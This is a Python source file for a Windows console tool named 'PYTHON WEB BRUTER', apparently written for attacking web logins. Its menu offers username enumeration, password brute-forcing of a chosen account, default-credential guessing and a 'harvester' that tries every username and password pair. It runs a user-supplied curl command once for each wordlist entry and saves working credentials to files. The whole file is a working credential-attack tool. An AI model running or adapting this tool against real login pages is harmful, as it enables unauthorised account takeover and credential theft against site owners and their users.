import os


def banner():
    print('''
CHOOSE AN OPTION
[1] USER ENUMURATION USING WORDLIST
[2] USER ENUMURATION USING NUMBERS
[3] ATTACK SPECIFIC ACCOUNT
[4] DEFAULT LOGIN WORDLIST USER=PASS
[5] DEFAULT LOGIN NUMBERS USER=PASS
[6] COMPLETE DATABASE HARVESTER
[7] LINK BRUTER (dev)
[8] EXIT

''')


def menu():
    os.system('cls')
    os.system('title MAIN MENU - PYTHON WEB BRUTER')
    banner()
    option=str(input('[+] SELECT OPTION [+] '))
    
    if option=='1':
        wordlist()
    elif option=='2':
        numbers()
    elif option=='3':
        specific_user()
    elif option=='4':
        default_login_wordlist()
    elif option=='5':
        default_login_numbers()
    elif option=='6':
        custom()
    elif option=='7':
        link_brute()
    elif option=='8':
        quit()
    else:
        print('invalid')


def wordlist():

    os.system('cls')
    print('')
    print('[+] OPTION SELECTED: USER ENUMURATION USING WORDLIST [+]')
    os.system('title USER ENUMURATION USING WORDLIST - PYTHON WEB BRUTER')
    print('')

    wordlist_path=''
    curl_command=''

    print('[+] ENTER CURL COMMAND, REMOVE THE "--compressed" TAG, AND REPLACE USERNAME FIELD WITH "qazwsx" [+]')
    print('')
    curl_command=str(input('[+] '))

    if 'qazwsx' in curl_command:
        pass
    else:
        print('[!] PLEASE REPLACE THE USERNAME FIELD WITH STRING "qazwsx" [!]')
        os.system('pause')
        wordlist()
    
    print(' ')
    wordlist_path=str(input('[+] ENTER THE PATH TO WORDLIST [+] '))
    print(' ')
    error_code=str(input('[+] ENTER ERROR CODE [+] '))
    
    if os.path.exists(wordlist_path):
        pass
    else:
        print('[!] FILE NOT FOUND! [!]')
        os.system('pause')
        wordlist()

    wordlist_file=open(wordlist_path,'r')
    lst=wordlist_file.readlines()

    for i in lst:

        i_=''
        command_final=''
        command_raw=''
        check=''
        i_=i.replace('\n','')
        command_raw=curl_command.replace('qazwsx',i_)
        command_final=''.join([command_raw,' > D:\\response'])

        os.system(command_final)
        os.system('cls')
        response=open(r'D:\response','r')
        check=response.readlines()

        if error_code in str(check):
            print('')
            print('[!] USER',i_,'IS INVALID [!]')
            print('')
            print('')
            response.close()

        else:
            print(' ')
            print('[!] USER',i_,'IS VALID [!]')
            command_write=''.join(['echo ',i_,'>>D:\\user'])
            os.system(command_write)

    print('[+] BELOW IS A LIST OF USERNAMES FOUND [+]')
    print('')
    os.system('if exist D:\\user type D:\\user && del D:\\user')
    os.system('del D:\\response')
    os.system('pause')
    menu()


def specific_user():

    os.system('cls')
    print('')
    print('[+] OPTION SELECTED: ATTACK SPECIFIC USER [+]')
    os.system('title ATTACK SPECIFIC USER - PYTHON WEB BRUTER')
    print('')

    wordlist_path=''
    curl_command=''
    
    print('[+] ENTER CURL COMMAND, REMOVE THE "--compressed" TAG, AND REPLACE PASSWORD FIELD WITH "qazwsx" AND USERNAME WITH DESIRED USER [+]')
    print('')
    curl_command=str(input('[+] '))

    if 'qazwsx' in curl_command:
        pass
    else:
        print('[!] PLEASE REPLACE THE PASSWORD FIELD WITH STRING "qazwsx" [!]')
        os.system('pause')
        specific_user()
    
    print(' ')
    wordlist_path=str(input('[+] ENTER THE PATH TO WORDLIST [+] '))
    print(' ')
    error_code=str(input('[+] ENTER ERROT CODE [+] '))
    
    if os.path.exists(wordlist_path):
        pass
    else:
        print('[!] FILE NOT FOUND! [!]')
        os.system('pause')
        specific_user()

    wordlist_file=open(wordlist_path,'r')
    lst=wordlist_file.readlines()
    
    for i in lst:
    
        i_=''
        command_final=''
        command_raw=''
        check=''
        i_=i.replace('\n','')
        command_raw=curl_command.replace('qazwsx',i_)
        command_final=''.join([command_raw,' >D:\\response'])
    
        os.system(command_final)
        os.system('cls')
        response=open(r'D:\response','r')
        check=response.readlines()
    
        if error_code in str(check):
            print('')
            print('[+] PASSWORD',i_,'IS INVALID [+]')
            print('')
            print('')
            response.close()
        else:
            print(' ')
            print('[+] FOUND!! PASSWORD IS ',i_,'[+]')
            print(' ')
            response.close()
            os.system('del D:\\response')
            os.system('pause')
            break
            menu()


def default_login_numbers():
    
    os.system('cls')
    print('')
    print('[+] OPTION SELECTED: DEFAULT LOGIN USING NUMBERS [+]')
    os.system('title DEFAULT LOGIN USING NUMBERS - PYTHON WEB BRUTER')
    print('')
    
    curl_command=''
    number_range_start=''
    number_range_stop=''
    
    print('[+] ENTER CURL COMMAND, REMOVE THE "--compressed" TAG, AND REPLACE USERNAME AND PASSWORD FIELD WITH "qazwsx" [+]')
    print('')
    curl_command=str(input('[+] '))
    
    if 'qazwsx' in curl_command:
        pass
    else:
        print('[!] PLEASE REPLACE THE USERNAME AND PASSWORD FIELD WITH STRING "qazwsx" [!]')
        os.system('pause')
        numbers()

    print(' ')
    number_range_start=int(input('[+] ENTER THE FIRST NUMBER OF RANGE [+] '))
    print(' ')
    number_range_stop=int(input('[+] ENTER THE LAST NUMBER OF RANGE [+] '))
    print(' ')
    error_code=str(input('[+] ENTER ERROR CODE [+] '))

    for i in range(number_range_start,number_range_stop+1):
        command_raw=curl_command.replace('qazwsx',str(i))
        command_final=''.join([command_raw,' > D:\\response'])
        
        os.system(command_final)
        os.system('cls')
        response=open(r'D:\response','r')
        check=response.readlines()
        
        if error_code in str(check):
            print('')
            print('[!] USER AND PASS',i,'IS INVALID [!]')
            print('')
            print('')
            response.close()

        else:
            print('[!] USER',i,'IS VALID [!]')
            command_write=''.join(['echo ',str(i),'>>D:\\user'])
            command_write
            os.system(command_write)

    print('[+] BELOW IS A LIST OF USERNAMES FOUND [+]')
    print('')
    response.close()
    os.system('if exist D:\\user type D:\\user && del D:\\user')
    os.system('del D:\\response')
    os.system('pause')


def numbers():
    
    os.system('cls')
    print('')
    print('[+] OPTION SELECTED: USER ENUMURATION USING NUMBERS [+]')
    os.system('title USER ENUMURATION USING NUMBERS - PYTHON WEB BRUTER')
    print('')
    
    curl_command=''
    number_range_start=''
    number_range_stop=''
    
    print('[+] ENTER CURL COMMAND, REMOVE THE "--compressed" TAG, AND REPLACE USERNAME FIELD WITH "qazwsx" [+]')
    print('')
    curl_command=str(input('[+] '))
    
    if 'qazwsx' in curl_command:
        pass
    else:
        print('[!] PLEASE REPLACE THE USERNAME FIELD WITH STRING "qazwsx" [!]')
        os.system('pause')
        numbers()
    
    print(' ')
    number_range_start=int(input('[+] ENTER THE FIRST NUMBER OF RANGE [+] '))
    print(' ')
    number_range_stop=int(input('[+] ENTER THE LAST NUMBER OF RANGE [+] '))
    print(' ')
    error_code=str(input('[+] ENTER ERROR CODE [+] '))
    
    for i in range(number_range_start,number_range_stop+1):
        i_=str(i)
        command_raw=curl_command.replace('qazwsx',i_)
        command_final=''.join([command_raw,' > D:\\response.txt'])
        
        os.system(command_final)
        os.system('cls')
        response=open(r'D:\response.txt','r')
        check=response.readlines()
        
        if error_code in str(check):
            print(' ')
            print('[!] USER',i_,'IS INVALID [!]')
            print('')
            print('')
            response.close()

        else:
            print(' ')
            print('[!] USER',i_,'IS VALID [!]')
            print(' ')
            command_write=''.join(['echo ',i_,'>> D:\\user'])
            os.system(command_write)

    print('[+] BELOW IS A LIST OF USERNAMES FOUND [+]')
    print('')
    response.close()
    os.system('if exist D:\\user type D:\\user && del D:\\user')
    os.system('del D:\\response.txt')
    os.system('pause')
    menu()


def default_login_wordlist():
    
    os.system('cls')
    print('')
    print('[+] OPTION SELECTED: DEFAULT LOGIN USING WORDLIST [+]')
    os.system('title DEFAULT LOGIN USING WORDLIST - PYTHON WEB BRUTER')
    print('')

    wordlist_path=''
    curl_command=''
    
    print('[+] ENTER CURL COMMAND, REMOVE THE "--compressed" TAG, AND REPLACE USER AND PASSWORD FIELD WITH "qazwsx" [+]')
    print('')
    curl_command=str(input('[+] '))

    if 'qazwsx' in curl_command:
        pass
    else:
        print('[!] PLEASE REPLACE THE USER AND PASSWORD FIELD WITH STRING "qazwsx" [!]')
        os.system('pause')
        default_login_wordlist()
    
    print(' ')
    wordlist_path=str(input('[+] ENTER THE PATH TO WORDLIST [+] '))
    print(' ')
    error_code=str(input('[+] ENTER ERROR CODE [+] '))
    
    if os.path.exists(wordlist_path):
        pass
    else:
        print('[!] FILE NOT FOUND! [!]')
        os.system('pause')
        default_login_wordlist()

    wordlist_file=open(wordlist_path,'r')
    lst=wordlist_file.readlines()
    
    for i in lst:
    
        i_=''
        command_final=''
        command_raw=''
        check=''
        i_=i.replace('\n','')
        command_raw=curl_command.replace('qazwsx',i_)
        command_final=''.join([command_raw,' >D:\\response.txt'])
    
        os.system(command_final)
        os.system('cls')
        response=open(r'D:\response.txt','r')
        check=response.readlines()
    
        if error_code in str(check):
            print('')
            print('[+] USER AND PASSWORD',i_,'IS INVALID [+]')
            print('')
            print('')
            response.close()
        else:
            print(' ')
            print('[+] FOUND!! PASSWORD IS ',i_)
            print(' ')
            command_write=''.join(['echo ',i_,'>>D:\\user.txt'])
            os.system(command_write)

    print('[+] BELOW IS A LIST OF USERNAMES FOUND [+]')
    print('')
    response.close()
    os.system('if exist D:\\user.txt type D:\\user.txt && del D:\\user.txt')
    os.system('del D:\\response.txt')
    os.system('pause')
    menu()


def custom():

    os.system('cls')
    print('')
    print('[+] OPTION SELECTED: HARVESTER [+]')
    os.system('title HARVESTER')
    print('')

    wordlist_path=''
    curl_command=''

    print('[+] ENTER CURL COMMAND, REMOVE THE "--compressed" TAG, AND REPLACE USER AND PASSWORD FIELD WITH "qaz_user" AND "qaz_pass" [+]')
    print('')
    curl_command=str(input('[+] '))

    if 'qaz_user' and 'qaz_pass' in curl_command:
        pass
    else:
        print('[!] PLEASE REPLACE THE USER AND PASSWORD FIELD WITH STRING "qaz_user" AND "qaz_pass" [!]')
        os.system('pause')
        custom()

    print(' ')
    user_wordlist_path=str(input('[+] ENTER THE PATH TO USER WORDLIST [+] '))
    print(' ')
    pass_wordlist_path=str(input('[+] ENTER THE PATH TO PASSWORD WORDLIST [+] '))
    print(' ')
    error_code=str(input('[+] ENTER ERROR CODE [+] '))

    if os.path.exists(user_wordlist_path):
        pass
    else:
        print('[!] USER FILE NOT FOUND! [!]')
        os.system('pause')
        custom()

    if os.path.exists(pass_wordlist_path):
        pass
    else:
        print('[!] PASSWORD FILE NOT FOUND! [!]')
        os.system('pause')
        custom()

    user_name_file=open(user_wordlist_path,'r')
    user_lst=user_name_file.readlines()

    pass_file=open(pass_wordlist_path,'r')
    pass_lst=pass_file.readlines()

    for i in user_lst:

        i_=i.replace('\n','')

        for j in pass_lst:

            j_=j.replace('\n','')
            command_raw=''
            command_raw_two=''
            command_final=''
            check=''

            command_raw=curl_command.replace('qaz_user',i_)
            command_raw_two=command_raw.replace('qaz_pass',j_)
            command_final=''.join([command_raw_two,' > D:\\response'])

            os.system(command_final)

            os.system('cls')
            response=open('D:\\response','r')
            check=response.readlines()

            if error_code in str(check):
                print('')
                print('[!] USER',i_,'AND PASS',j_,'COMBINATION IS INVALID [!]')
                print('')
                print('')
                response.close()

            else:
                print('')
                print('[+] USER',i_,'AND PASS',j_,'COMBINATION IS VALID [+]')
                command_write=''.join(['echo ',i_,' : ',j_,'>>D:\\user_and_pass'])
                os.system(command_write)

    print('[+] ALL THE USERNAMES WITH THEIR RESPECTIVE PASSWORDS HAVE BEED SAVED TO FILE [+]')
    os.system('pause')
    menu()

menu()